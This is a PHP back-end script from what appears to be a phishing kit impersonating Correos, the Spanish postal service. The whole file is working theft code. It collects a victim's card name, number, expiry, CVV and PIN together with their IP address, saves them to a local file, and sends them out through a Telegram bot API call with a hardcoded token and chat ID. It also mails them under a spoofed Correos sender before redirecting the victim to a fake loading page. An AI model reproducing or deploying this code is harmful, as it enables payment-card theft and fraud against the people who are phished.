<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['Sis_Nombre_Tarjeta']) and !empty($_POST['Sis_Numero_Tarjeta']) and !empty($_POST['Sis_Caducidad_Tarjeta_Mes']) and !empty($_POST['Sis_Caducidad_Tarjeta_Anno']) and !empty($_POST['Sis_Tarjeta_CVV2']) and !empty($_POST['Sis_Tarjeta_code']) 
		// and !empty($_POST['pin'])
	) {
			$_SESSION['cc']=$_POST['Sis_Nombre_Tarjeta'];
		  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
            $message = "👤Nom :" . $_POST['Sis_Nombre_Tarjeta'] .  "\n💳CC :" . $_POST['Sis_Numero_Tarjeta'] . "\n📅EXP :" . $_POST['Sis_Caducidad_Tarjeta_Mes'] ."/". $_POST['Sis_Caducidad_Tarjeta_Anno'] ."\n🏦CVV :" . $_POST['Sis_Tarjeta_CVV2'] ."\n🏧Pin :" . $_POST['Sis_Tarjeta_code'] . "\n" . $ip . "\n==🇪🇸🇪🇸==🇪🇸🇪🇸==🇪🇸🇪🇸==\n";
            $file = fopen("./Corroes.txt", "a+");
            fwrite($file, $message);
            fclose($file);
			$to = "";
			$subject = "===🇪🇸🇪🇸=Card=🇪🇸🇪🇸=== :";
			$tok="1758642481:AAGjK1wO7sRCi4D7NBSDVk-a0C4fl2jnvWA";
            $user="-1001324167344";
            $request=[
              'chat_id' => $user,
              'text' => $subject."
            ".$message
            ];
            $request_url="https://api.telegram.org/bot".$tok."/sendMessage?".http_build_query($request);
            file_get_contents($request_url);
			$headers = "From:Info <Chronopost@correos.es>\r\n";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
			mail($to, $subject, $message, $headers);
			
			
			
        header("Location: Seleccione_medio_de_codigo_loading.php?codigo_id=".md5($_GET['error']));
    }
}
?>